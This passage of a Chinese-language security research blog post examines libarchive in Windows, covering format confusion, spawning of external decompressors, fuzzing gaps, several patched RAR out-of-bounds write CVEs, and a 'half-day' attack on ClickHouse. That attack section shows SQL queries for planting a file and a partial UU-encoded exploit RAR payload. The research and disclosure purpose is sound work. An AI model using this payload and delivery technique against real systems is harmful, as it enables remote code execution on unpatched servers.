<p>雖然檔案總管在呼叫 <code class="language-plaintext highlighter-rouge">CreateSymbolicLinkA</code> 時，有啟用 <code class="language-plaintext highlighter-rouge">SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE</code>，但手冊中說到必須要開啟開發人員模式，才能使此 flag 作用：
<img src="/assets/img/blog/20250212/27.png" alt="" /></p>

<p>所以目前這個弱點只能用來攻擊管理員或是開發者，感覺還是一個不完整的功能。因此，這個弱點被判定為不優先修復。</p>

<h2 id="libarchive">Libarchive</h2>

<p>前一部分提到 <code class="language-plaintext highlighter-rouge">zipfldr.dll</code> 負責處理與「Compressed (zipped) Folder」、「Compressed Archive Folder」互動的邏輯。但實際上負責解壓縮的是 libarchive，在 Windows 系統上對應的 DLL 是 <code class="language-plaintext highlighter-rouge">archiveint.dll</code>。 libarchive 被廣泛使用在 Linux、BSD、macOS 等作業系統，以及 ClickHouse、Homebrew、Osquery 等等知名大型專案中。自 2016 起，Google 的 OSS-Fuzz 專案便 24 小時不間斷地對其進行模糊測試，是歷經時間考驗的函式庫。在黑箱測試時，我們觀察到下列幾件有趣的事情。</p>

<h3 id="fun-fact-1-windows-supports-file-formats-more-than-they-claimed">Fun Fact 1: Windows Supports File Formats More Than They Claimed</h3>

<p>雖然微軟在 KB5031455 更新中宣稱他們新增了以下 11 種壓縮格式的原生支援，但實際上他們所支援的檔案格式遠遠超過 11 種。
<img src="/assets/img/blog/20250212/28.png" alt="" /></p>

<p>在 <code class="language-plaintext highlighter-rouge">zipfldr.dll</code> 中我們看到 Ｗindows 是這樣設定 libarchive 的：
<img src="/assets/img/blog/20250212/29.png" alt="" /></p>

<p>但實際上，<code class="language-plaintext highlighter-rouge">archive_read_support_format_all</code> 會啟用 libarchive 中 ar、cpio、lha、mtree、tar、xar、warc、7zip、cab、rar、rar5、iso9660、zip 等 13 種壓縮檔案格式；<code class="language-plaintext highlighter-rouge">archive_read_support_filter_all</code> 會啟用 libarchive 中 bzip2、compress、gzip、lzip、lzma、xz、uu、rpm、lrzip、lzop、grzip、lz4、zstd 等 13 種格式。</p>

<p>由於 format 與 filter 可以同時使用，例如，支援 <code class="language-plaintext highlighter-rouge">.tar.gz</code> 格式即是同時啟用 format 中的 tar 與 filter 中的 gzip。所以實際上 Windows 11 支援了 13+13+13×13=195 種格式嗎？</p>

<p>大錯特錯，filter 最多可以串連 25 個，例如：<code class="language-plaintext highlighter-rouge">archive.rar.gzip.xz.uu.zstd.uu......</code> 也就是說 Windows 11 實際上支援了 13+13+13×13²⁵ 種格式，也就是 <code class="language-plaintext highlighter-rouge">91733330193268616658399616035</code> 種格式！佛心公司！佛心公司！</p>

<p><strong>也因此，更新後的攻擊面大幅擴展。只要 libarchive 中的任一檔案格式存在漏洞，在 Windows 上都可以被觸發。此外，同時解析多種 filter 時，也可能存在安全弱點。相較於原本僅 11 種格式的情況，潛在風險已大幅增加。</strong></p>

<h3 id="fun-fact-2-file-format-confusion">Fun Fact 2: File Format Confusion</h3>

<p>使用 libarchive 時，並不需要提供副檔名或是指定格式，libarchive 會根據檔案內容自動辨識當前檔案的格式，接著以對應的方式進行解壓縮。但在啟用 ZIP 的情況下可能會有 File Format Confusion 的狀況發生。舉個例子，如果我們建立一個 demo3.rar，並且裡面放入一個 poc.zip 的檔案，如下圖所示：</p>

<p><img src="/assets/img/blog/20250212/30.png" alt="" /></p>

<p>如果我們在 Windows 上直接點兩下 demo3.rar 開啟的話，會發現我們僅能看到 poc2.txt 這個文字檔案，其餘的資料夾、檔案，甚至 poc.zip 都不存在。因為 libarchive 將 demo3.rar 誤認為一個 ZIP 檔案！</p>

<p>為了理解原因，我們首先觀察一下 libarchive 是如何選定檔案格式的。libarchive 會在 <code class="language-plaintext highlighter-rouge">choose_format</code> 這個函式中，呼叫已啟用的 format 的 <code class="language-plaintext highlighter-rouge">bid</code> 函式，而哪個格式的 <code class="language-plaintext highlighter-rouge">bid</code> 回傳的數值最高，libarchive 就會將檔案當作該格式處理。
<img src="/assets/img/blog/20250212/31.png" alt="" /></p>

<p>以 <code class="language-plaintext highlighter-rouge">ar</code> 為例，如果檔案的起頭是 <code class="language-plaintext highlighter-rouge">"!&lt;arch&gt;\n"</code> 這 8 個字元，<code class="language-plaintext highlighter-rouge">archive_read_format_ar_bid</code> 就會回傳 64，推測是 8𝑏𝑖𝑡𝑠 × 8𝑏𝑦𝑡𝑒𝑠 = 64，看起來好像挺有道理的。</p>

<p><img src="/assets/img/blog/20250212/32.png" alt="" /></p>

<p>接著，看到 RAR 的格式可以發現它最高的分數只會是 30。雖然 30 不知道怎麼算來的，但如果每個檔案格式都是從檔案的起頭開始檢查，應該也很難做出會讓這個機制壞掉的 polyglot，對吧？
<img src="/assets/img/blog/20250212/33.png" alt="" /></p>

<p>但，libarchive 的 ZIP 中有個神奇的模式：seekable。也就是 ZIP 的 signature 不需要在檔案的開頭，libarchive 會自行去尋找，而 seekable zip 最高的數值為 32:
<img src="/assets/img/blog/20250212/34.png" alt="" /></p>

<p>所以當 RAR 壓縮率不足，還保留有 ZIP 的 signature 時，libarchive 會將包有 ZIP 檔案的 RAR 檔案當作 ZIP 來處理。</p>

<h3 id="fun-fact-3-sometimes-libarchive-tries-to-spawn-an-external-executable">Fun Fact 3: Sometimes, Libarchive Tries to Spawn an External Executable</h3>

<p>在 libarchive 的 source code 中可以發現，如果編譯時缺少一些 library，libarchive 執行時會嘗試直接呼叫外部指令來協助解壓縮：
<img src="/assets/img/blog/20250212/35.png" alt="" /></p>

<p>如果 decompile Windows 中對應的 <code class="language-plaintext highlighter-rouge">archiveint.dll</code>，可以發現某些格式確實會呼叫外部的執行檔案，以 lzop 的 <code class="language-plaintext highlighter-rouge">lzop_bidder_init</code> 為例：
<img src="/assets/img/blog/20250212/36.png" alt="" /></p>

<p>因此，根據「libarchive 會自行根據檔案內容決定用什麼格式進行解壓縮」的事實，我們只要將一個 lzop 格式的壓縮檔案的副檔名改為 <code class="language-plaintext highlighter-rouge">.rar</code>，對其點兩下開啟，就能觸發對應的 lzop 解壓縮函式 <code class="language-plaintext highlighter-rouge">lzop_bidder_init</code>：
<img src="/assets/img/blog/20250212/37.png" alt="" /></p>

<p>接著就會看到 <code class="language-plaintext highlighter-rouge">archiveint.dll</code> 嘗試使用外部指令 <code class="language-plaintext highlighter-rouge">lzop -d</code> 來進行解壓縮。結果就是 <code class="language-plaintext highlighter-rouge">explorer.exe</code> 會去 <code class="language-plaintext highlighter-rouge">PATH</code> 中尋找有沒有 <code class="language-plaintext highlighter-rouge">lzop.exe</code> 存在，並嘗試執行：</p>

<p><img src="/assets/img/blog/20250212/38.png" alt="" /></p>

<h3 id="rces-reported-by-morse-cve-2024-20696-and-cve-2024-20697">RCEs Reported by MORSE: CVE-2024-20696 and CVE-2024-20697</h3>

<p>到目前為止，不難發現 libarchive 帶來許多攻擊面。實際上，Windwos 也在 2024 的 1 月修復了微軟研究團隊 Microsoft Offensive Research Security Engineering (MORSE) team 回報的兩個漏洞，分別是與 <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20696">CVE-2024-20696</a> 與 <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20697">CVE-2024-20697</a> 兩個 RCE 漏洞。</p>

<h4 id="cve-2024-20696-oob-write-in-copy_from_lzss_window_to_unp">CVE-2024-20696: OOB Write In <code class="language-plaintext highlighter-rouge">copy_from_lzss_window_to_unp</code></h4>

<p>CVE-2024-20696 發生在 libarchive 解壓縮 RAR 格式的檔案時候。在解壓縮的過程中 <code class="language-plaintext highlighter-rouge">copy_from_lzss_window_to_unp</code> 的第四個參數 <code class="language-plaintext highlighter-rouge">length</code> 是根據 lzss 解壓縮後的狀態計算出的 copy length。由於 <code class="language-plaintext highlighter-rouge">copy_from_lzss_window_to_unp</code> 在這裡錯誤地將 <code class="language-plaintext highlighter-rouge">length</code> 定義為 int，導致攻擊者可以透過構造 lzss 將 <code class="language-plaintext highlighter-rouge">length</code> 變為負數，從而繞過檢查造成越界寫的漏洞。</p>

<p><img src="/assets/img/blog/20250212/39.png" alt="" /></p>

<h4 id="cve-2024-20697-oob-write-in-execute_filter_e8">CVE-2024-20697: OOB Write In <code class="language-plaintext highlighter-rouge">execute_filter_e8</code></h4>

<p>CVE-2024-20697 也發生在 libarchive 解壓縮 RAR 格式的檔案時候。如果 RAR 檔案有使用到 <code class="language-plaintext highlighter-rouge">filter e8</code> 時（RAR 檔案格式的 filter，與 libarchive 的 filter 無關），解壓縮便會觸發 libarchive 的 <code class="language-plaintext highlighter-rouge">execute_filter_e8</code>。
<code class="language-plaintext highlighter-rouge">execute_filter_e8</code> 在檢查 <code class="language-plaintext highlighter-rouge">length</code> 時雖然是檢查 <code class="language-plaintext highlighter-rouge">length</code> 必須大於等於 4，但是在迴圈計算卻使用了 <code class="language-plaintext highlighter-rouge">length - 5</code>，所以當 <code class="language-plaintext highlighter-rouge">legnth</code> 為 4 時，迴圈便會執行 0x100000000 次，導致越界寫。</p>

<p><img src="/assets/img/blog/20250212/40.png" alt="" /></p>

<h4 id="fuzzing-why-oss-fuzz-never-found-hese">Fuzzing: Why OSS-Fuzz Never Found hese?</h4>

<p><img src="/assets/img/blog/20250212/41.png" alt="" /></p>

<p>在復現這兩個 CVE 時，由於需要構造 RAR，製作起來較耗費時間，例如在 CVE-2024-20696 中需要構造 lzss 使得 <code class="language-plaintext highlighter-rouge">length</code> 的計算結果為負數，而在 CVE-2024-20697 中我們需要放入 filter e8，在構造上較為麻煩。因此我們透過 AFL++ ，將合法的 RAR 以及有使用 filter e8 的 RAR 作為 seed 進行 Fuzzing。意外的是，僅在 56 秒之內我們就找到了一個 CVE-2024-20697 的 crash：
<img src="/assets/img/blog/20250212/42.png" alt="" /></p>

<p>很快就能找到 crash 當然是好事，但這裡有一個大問題：OSS-Fuzz 至少從 2016 年開始就 24 小時全年無休的對 libarchive 進行 Fuzzing，56 秒就能夠找到 crash 的漏洞怎麼可能還沒有被發現呢？
<img src="/assets/img/blog/20250212/43.png" alt="" /></p>

<p>從 OSS-Fuzz 對 libarchive 的總結可以看到，六月時，OSS-Fuzz 對 libarchive 進行的 Fuzzing 的覆蓋率僅有 15.03%:</p>

<p><img src="/assets/img/blog/20250212/44.png" alt="" /></p>

<p>而且看起來已經持續了很長一段時間：
<img src="/assets/img/blog/20250212/45.png" alt="" /></p>

<p>從檔案來看，可以發現有些 format 基本上沒有被測試過，例如 RAR 的覆蓋率僅有 4.07%
<img src="/assets/img/blog/20250212/46.png" alt="" /></p>

<h4 id="謎底揭曉">謎底揭曉</h4>

<p>在我們準備演講的同時，libarchive 的 GitHub 上有個關於 OSS-Fuzz 的 commit。他是這麼說的： libarchive 在提交給 OSS-Fuzz 執行的設定中，呼叫 CMake 時雖然有啟用 <code class="language-plaintext highlighter-rouge">DONT_FAIL_ON_CRC_ERROR</code>，但卻從來都沒有在 CMake 中好好定義這個 option！
<img src="/assets/img/blog/20250212/47.png" alt="" /></p>

<p>本來，<code class="language-plaintext highlighter-rouge">DONT_FAIL_ON_CRC_ERROR</code> 這個 flag 會讓 libarchive 在 CRC 不符的情況下也繼續處理該檔案。而我們都知道 Fuzzer 一直都不擅於構造出正確的 checksum。也就是說 OSS-Fuzz 覆蓋率長期低下的原因是因為 Fuzzer 無法產生出合法的 CRC 來通過檢查，導致 Fuzzer 永遠卡在 libarchive 檢查 CRC 的邏輯之中。</p>

<p>修正之後可以看到 OSS-Fuzz 對 libarchive 的覆蓋率有飛躍性的提升，從 15.03% 提升到 63.10%。</p>

<p><img src="/assets/img/blog/20250212/48.png" alt="" /></p>

<p>從個別檔案的覆蓋率來看也可以發現大部分的檔案格式覆蓋率大幅提升：
<img src="/assets/img/blog/20250212/49.png" alt="" /></p>

<h4 id="keep-fuzzing">Keep Fuzzing</h4>

<p><img src="/assets/img/blog/20250212/50.png" alt="" /></p>

<p>在進行 code review 的同時我們讓 AFL++ 繼續為我們勞動，除了我們接下來即將提到的 RCE 漏洞之外，我們還透過 Fuzzing 找到了 CVE-2024-48957、CVE-2024-48958 兩個越界讀漏洞。</p>

<p><img src="/assets/img/blog/20250212/51.png" alt="" /></p>

<h3 id="cve-2024-26256-libarchive-remote-code-execution-vulnerability">CVE-2024-26256: Libarchive Remote Code Execution Vulnerability</h3>

<p>在分析了微軟自行回報的 CVE-2024-20696 以及 CVE-2024-20697 之後，我們可以發現這兩個漏洞皆出現在解析 RAR 的 <code class="language-plaintext highlighter-rouge">archive_read_support_format_rar.c</code> 中，而且都是近三年加入的 feature。</p>

<p><img src="/assets/img/blog/20250212/52.png" alt="" /></p>

<p>所以我們決定從 RAR 開始進行檢查，看看是否還能發現其他漏洞。而我們第一個想知道的是，CVE-2024-20697 成因中的「<code class="language-plaintext highlighter-rouge">filter_e8</code>」是什麼? Commit message 的「support rar filters」的「filters」是什麼？</p>

<h4 id="rar-中的-vm">RAR 中的 VM</h4>

<p>要知道 <code class="language-plaintext highlighter-rouge">filter_e8</code> 是什麼，我們首先得先知道：其實 RAR 中有一個 VM！RAR 實際上包含了一個 register-based VM，這個 VM 可以執行自訂的小程式來增加 RAR 的壓縮比。具體方式就是在建立 RAR 檔案時，可以在裡面放入客製的「filter」小程式，所以 <code class="language-plaintext highlighter-rouge">filter_e8</code> 實際上就是這麼一個程式，他是專門為了 Intel 的 binary 所產生的一個增加壓縮比的程式，而名稱中的 <code class="language-plaintext highlighter-rouge">e8</code> 源自於 Intel 指令集中 near call 的 opcode：</p>

<p><img src="/assets/img/blog/20250212/53.png" alt="" /></p>

<p>但是 call instruction 與改善壓縮比之間的關係是什麼？以下面的程式為例，假設在程式中，有兩個位置呼叫了 <code class="language-plaintext highlighter-rouge">funcA</code>，程式會產生兩個 call 指令，在這裏分別是位置 <code class="language-plaintext highlighter-rouge">0</code> 與位置 <code class="language-plaintext highlighter-rouge">0x10</code>。在 Intel 的機器語言中，我們可以看到 near call 是以 <code class="language-plaintext highlighter-rouge">0xe8</code> 開頭，後面跟著四個 bytes，也就是手冊中說的 <code class="language-plaintext highlighter-rouge">rel32</code>。<code class="language-plaintext highlighter-rouge">rel32</code> 即是呼叫的目標與下一條指令的相對位置，以第一條 call 指令來看，<code class="language-plaintext highlighter-rouge">rel32</code> 是 <code class="language-plaintext highlighter-rouge">0x1b</code>，即是呼叫的目標（0x20），減去下一條指令（0+5）所得出的相對位置 <code class="language-plaintext highlighter-rouge">0x1b</code>：</p>

<p><img src="/assets/img/blog/20250212/54.png" alt="" /></p>

<p>這兩條指令雖然皆是呼叫 funcA，但由於內容不同，在進行壓縮時表現就較差。那既然 <code class="language-plaintext highlighter-rouge">rel32</code> 是可以簡單計算來的，那只要先把 <code class="language-plaintext highlighter-rouge">rel32</code> 的位置都先替換成目標的位置，機器語言會就長得一樣，壓縮比就能夠進一步上升！</p>

<p><img src="/assets/img/blog/20250212/55.png" alt="" /></p>

<p>在解壓縮時，只要將把被替代掉的 <code class="language-plaintext highlighter-rouge">rel32</code> 透過計算還原回來就好了，這一步便是使用 <code class="language-plaintext highlighter-rouge">e8 filter</code> 將之復原。</p>

<p><img src="/assets/img/blog/20250212/56.png" alt="" /></p>

<p>而 libarchive 的實作為了簡化，並沒有實作整個 VM，而是單純將 filter 程式的內容進行 crc32 運算，並將結果作為 fingerprint，直接執行對應的 filter，參考 <a href="https://github.com/libarchive/libarchive/blob/42565b88b5cc7441239269902a9d1735fd9ca0e2/libarchive/archive_read_support_format_rar.c#L3826">libarchive</a>:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span>
<span class="nf">execute_filter</span><span class="p">(</span><span class="k">struct</span> <span class="nc">archive_read</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">rar_filter</span> <span class="o">*</span><span class="n">filter</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">rar_virtual_machine</span> <span class="o">*</span><span class="n">vm</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">pos</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">fingerprint</span> <span class="o">==</span> <span class="mh">0x1D0E06077D</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">execute_filter_delta</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span> <span class="n">vm</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">fingerprint</span> <span class="o">==</span> <span class="mh">0x35AD576887</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">execute_filter_e8</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span> <span class="n">vm</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">fingerprint</span> <span class="o">==</span> <span class="mh">0x393CD7E57E</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">execute_filter_e8</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span> <span class="n">vm</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">fingerprint</span> <span class="o">==</span> <span class="mh">0x951C2C5DC8</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">execute_filter_rgb</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span> <span class="n">vm</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">fingerprint</span> <span class="o">==</span> <span class="mh">0xD8BC85E701</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">execute_filter_audio</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span> <span class="n">vm</span><span class="p">);</span>

  <span class="n">archive_set_error</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a</span><span class="o">-&gt;</span><span class="n">archive</span><span class="p">,</span> <span class="n">ARCHIVE_ERRNO_FILE_FORMAT</span><span class="p">,</span> <span class="s">"No support for RAR VM program filter"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>在 RAR v5 之後，filter 在 RAR 中變成了 enum 類型，只能選用預先定義好的 filter，可以參考 <a href="https://www.rarlab.com/rar_add.htm">UnRAR source</a>:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">enum</span> <span class="n">FilterType</span> <span class="p">{</span>
  <span class="c1">// These values must not be changed, because we use them directly</span>
  <span class="c1">// in RAR5 compression and decompression code.</span>
  <span class="n">FILTER_DELTA</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">FILTER_E8</span><span class="p">,</span> <span class="n">FILTER_E8E9</span><span class="p">,</span> <span class="n">FILTER_ARM</span><span class="p">,</span> 
  <span class="n">FILTER_AUDIO</span><span class="p">,</span> <span class="n">FILTER_RGB</span><span class="p">,</span> <span class="n">FILTER_ITANIUM</span><span class="p">,</span> <span class="n">FILTER_TEXT</span><span class="p">,</span> 
  
  <span class="c1">// These values can be changed.</span>
  <span class="n">FILTER_LONGRANGE</span><span class="p">,</span><span class="n">FILTER_EXHAUSTIVE</span><span class="p">,</span><span class="n">FILTER_NONE</span>
<span class="p">};</span>
</code></pre></div></div>

<h4 id="code-review">Code Review</h4>

<p>filter 的行為看起來很有趣，而微軟所發現的漏洞也位於 filter 之內，所以我們嘗試對 <code class="language-plaintext highlighter-rouge">archive_read_support_format_rar.c</code> 進行 code reveiw。</p>

<p>經過一段時間我們也在<code class="language-plaintext highlighter-rouge">copy_from_lzss_window</code> 找到了一個 heap buffer overflow 的漏洞，<code class="language-plaintext highlighter-rouge">copy_from_lzss_window</code> 的參數 <code class="language-plaintext highlighter-rouge">length</code> 沒有任何檢查就直接使用於 <code class="language-plaintext highlighter-rouge">memcpy</code>，而 buffer 的大小僅為 0x40004 bytes：
<img src="/assets/img/blog/20250212/57.png" alt="" /></p>

<p>從呼叫 <code class="language-plaintext highlighter-rouge">copy_from_lzss_window</code> 的地方來看，可以發現這是用來將資料複製進 VM 記憶體的函式：
<img src="/assets/img/blog/20250212/58.png" alt="" /></p>

<p>漏洞成因看起來非常簡單，但較麻煩的是需要構造 libarchive 願意執行的 filter，並提供正確長度的資料。這些資訊並不直接存在於 RAR 中最表層的欄位，而是存在於 data 之中。並且，data 經過 Huffman coding 編碼，因此後面所提供的資訊也必須先進行一次編碼，而且不是 byte by byte 而是 7-bit by 7-bit。由於這部分不是本文的重點，我們不在這裡展開來講，我們鼓勵讀者進行復現。</p>

<p><img src="/assets/img/blog/20250212/59.png" alt="" /></p>

<p>這個漏洞已經被微軟修復：<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26256">CVE-2024-26256</a>。而這個漏洞沒有被 Fuzzer 發現的原因也很簡單，雖然 <code class="language-plaintext highlighter-rouge">filter-&gt;blocklength</code> 只要夠大就能夠觸發越界寫，但需要提供與 <code class="language-plaintext highlighter-rouge">filter-&gt;blocklength</code> 一樣長的 data 才能通過檢查，而在 coverage 相同的情況下，Fuzzer 通常傾向於將檔案縮小。</p>

<h3 id="half-day長得像-0-day-的-1-day">Half-day：長得像 0-day 的 1-day</h3>

<p>當我們稍早提到「微軟研究團隊 Microsoft Offensive Research Security Engineering (MORSE) team 回報的兩個漏洞」時。我們提到在構造 PoC 上較困難，或許有人馬上就想到了：「為什麼不去 libarchive 的 GitHub repository 找 test 或是說明呢？」對，我們找過了，沒有。</p>

<p>因為當時的 libarchive 甚至還沒有被 patch，或是說，可能甚至沒有人知道漏洞已經存在！微軟在一月時，就已經修復 Windows fork 出去的 libarchive：
<img src="/assets/img/blog/20250212/60.png" alt="" /></p>

<p>在研究結束之後，我們才在 libarchive 的 GitHub repository 上看到對應的兩個 patch ，分別是五月跟四月才被 merge 進去：
<img src="/assets/img/blog/20250212/61.png" alt="" /></p>

<p>那豈不是只要長期有關注 Windows patch 的人馬上就會發現 libarchive upstream 存在兩個尚未修補的漏洞嗎？它們對於 Windows forked 版本的 libarchive 來說是 1-day，因為漏洞已被發現並且修補了；對 libarchive upstream 來說是 0-day，因為尚未有修補存在且維護者甚至可能不知情！我們接下來會將這種情況稱為「0.5-day」或是「Half-day」。</p>

<p>於是我們開始尋找有使用 libarchive 的大型專案，我們想嘗試模擬這個「利用 Half-day 攻擊」的場景，同時也認為，在軟體中採用 libarchive 的廠商會更願意幫我們敦促 libarchive 修補漏洞。</p>

<h3 id="attacking-clickhouse">Attacking ClickHouse</h3>

<p>經過一番調查後，我們發現 ClickHouse 有使用 libarchive 進行解壓縮，非常有可能包含了存在漏洞的程式碼。在 ClickHouse 中我們可以透過 file table engine 對壓縮檔內的資料進行操作：
<img src="/assets/img/blog/20250212/62.png" alt="" /></p>

<p>不過手冊也提到，ClickHouse 僅支援 zip、tar、7z 三種格式的壓縮檔案：
<img src="/assets/img/blog/20250212/63.png" alt="" /></p>

<p>但真的是這樣嗎？除了 zip 之外，tar 與 7z 在 ClickHouse 中由 <code class="language-plaintext highlighter-rouge">TarArchiveReader</code> 與 <code class="language-plaintext highlighter-rouge">SevenZipArchiveReader</code> 實作，兩者皆繼承於 <code class="language-plaintext highlighter-rouge">LibArchiveReader</code>。<code class="language-plaintext highlighter-rouge">LibArchiveReader</code> 開啟檔案的行為實作於 <code class="language-plaintext highlighter-rouge">open</code> 函式，在 <a href="https://github.com/ClickHouse/ClickHouse/blob/0bd3016a17dab23e64a7e550b2754ce7f7aa1d82/src/IO/Archives/LibArchiveReader.cpp#L150">source code</a> 中可看到熟悉的 pattern：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">static</span> <span class="k">struct</span> <span class="nc">archive</span> <span class="o">*</span> <span class="nf">open</span><span class="p">(</span><span class="k">const</span> <span class="n">String</span> <span class="o">&amp;</span> <span class="n">path_to_archive</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">auto</span> <span class="o">*</span> <span class="n">archive</span> <span class="o">=</span> <span class="n">archive_read_new</span><span class="p">();</span>
        <span class="k">try</span>
        <span class="p">{</span>
            <span class="n">archive_read_support_filter_all</span><span class="p">(</span><span class="n">archive</span><span class="p">);</span>
            <span class="n">archive_read_support_format_all</span><span class="p">(</span><span class="n">archive</span><span class="p">);</span>
</code></pre></div></div>

<p>沒錯，ClickHouse 也是使用 <code class="language-plaintext highlighter-rouge">archive_read_support_format_all</code> 與 <code class="language-plaintext highlighter-rouge">archive_read_support_filter_all</code>，表示我們一樣可以觸發存在於 RAR 中的弱點！接下來只要讓 ClickHouse 為我們解壓縮檔案即可，雖然現在解壓縮的 feature 可以直接存取 s3 上的檔案，但<strong>當時並不能這樣使用</strong>：
<img src="/assets/img/blog/20250212/64.png" alt="" /></p>

<p>所以我們必須先上傳檔案，可以透過下列 query 新增一個 table，並且該 table 會以檔案的形式被儲存：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">TABLE</span> <span class="k">FUNCTION</span>
<span class="n">file</span><span class="p">(</span><span class="s1">'poc.7z'</span><span class="p">,</span> <span class="s1">'Native'</span> <span class="p">,</span><span class="s1">'column1 String'</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="s1">'payload'</span><span class="p">)</span>
</code></pre></div></div>

<p>但這樣產生的 file 會包含 table 的 metadata，在有 metadata 的情況下我們沒有辦法使 libarchive 認為這是一個 RAR 檔案，進而觸發漏洞：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000: 0101 0763 6f6c 756d 6e31 0653 7472 696e  ...column1.Strin
00000010: 6707 7061 796c 6f61 64                   g.payload
</code></pre></div></div>

<p>我們需要在 ClickHouse 的 <a href="https://clickhouse.com/docs/en/interfaces/formats">Output Data Formats</a> 中尋找哪些格式不會在檔案的開頭存放置 metadata。最後我們決定使用 <code class="language-plaintext highlighter-rouge">TabSeparatedRaw</code>，在 <code class="language-plaintext highlighter-rouge">TabSeparatedRaw</code> 中：</p>

<ol>
  <li>資料被一列一列儲存</li>
  <li>一列中的資料被 tab 分隔開</li>
  <li>資料內不能有 tab 或換行</li>
</ol>

<p>例如，如果使用下列兩個 qeury:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">TABLE</span> <span class="k">FUNCTION</span>
<span class="n">file</span><span class="p">(</span><span class="s1">'test.7z'</span><span class="p">,</span> <span class="s1">'TabSeparatedRaw'</span><span class="p">,</span> <span class="s1">'column1 String'</span><span class="p">)</span>
<span class="k">VALUES</span> <span class="p">(</span><span class="s1">'row1 string'</span><span class="p">)</span>

<span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">TABLE</span> <span class="k">FUNCTION</span>
<span class="n">file</span><span class="p">(</span><span class="s1">'test.7z'</span><span class="p">,</span> <span class="s1">'TabSeparatedRaw'</span><span class="p">,</span> <span class="s1">'column1 String'</span><span class="p">)</span>
<span class="k">VALUES</span> <span class="p">(</span><span class="s1">'row2 string'</span><span class="p">)</span>
</code></pre></div></div>

<p>最後產出的檔案內容會是：</p>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>row1 string
row2 string
</code></pre></div></div>

<p>因此，若可以處理好第三點「資料內不能有 tab 或換行」，那我們就可以構造出一個合法的 RAR 檔案！那該怎麼樣避免使用 tab 或換行呢？聽起來很難，但不要忘了，ClickHouse 呼叫了 <code class="language-plaintext highlighter-rouge">archive_read_support_filter_all</code> 為我們開啟了所有的 filter！其中，最符合 <code class="language-plaintext highlighter-rouge">TabSeperatedRaw</code> 描述的就是 UUencode，經過 UUencode 的資料會長這樣：</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>begin 600 exploit.rar.uu
M4F%R(1H'`,^0&lt;P``#0````````!287(A&amp;@&lt;`SY!S```-`````````%VI=("0
M,0"VXP0`4,\+``(2'^X4O1EY5QTU#``@````;7-V8W(Q,#`N9&amp;QL`/#&lt;ZFP8
M(AE0S(EB'!(",EM(4I0M-"H*"T6JBHJ!1$1T%IKHFBA0H*:(VV2VP)98R9+*
M"*`T'I;&amp;]1&gt;J]&gt;HZ!&gt;KU4=(ZQTC:4VHB@J4WH2D-%--VSX9S);9IOO.9HF2E
MH47O?/GG[Y^6LSGO/&gt;&gt;Z&gt;&gt;\]YJS!N3_(^_P3SS"O\S`P+6&lt;_V'P(,#`P,#`B
M.EX#-(,!V$Z07A+LVZ?4@K:RB=`NN&lt;+9(IB&lt;?NX``Y[L`3`P,#``,`'/YCL*
</code></pre></div></div>

<p>因此最後我們只需要將原本的 rar payload 進行 UUEncode 之後上傳：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">TABLE</span> <span class="k">FUNCTION</span>
<span class="n">file</span><span class="p">(</span><span class="s1">'poc.7z'</span><span class="p">,</span> <span class="s1">'TabSeparatedRaw'</span><span class="p">,</span> <span class="s1">'column1 String'</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="n">uu_encoded_rar_payload</span><span class="p">)</span>
</code></pre></div></div>

